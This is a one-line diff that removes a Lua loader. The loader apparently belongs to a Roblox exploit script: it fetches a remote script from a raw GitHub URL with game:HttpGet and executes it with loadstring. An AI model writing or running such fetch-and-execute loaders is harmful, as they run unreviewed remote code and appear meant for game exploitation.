@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/mechagodzilla2021-remodel-kaiju-alpha-spam5-fyu9iarro4juul.lua"))()
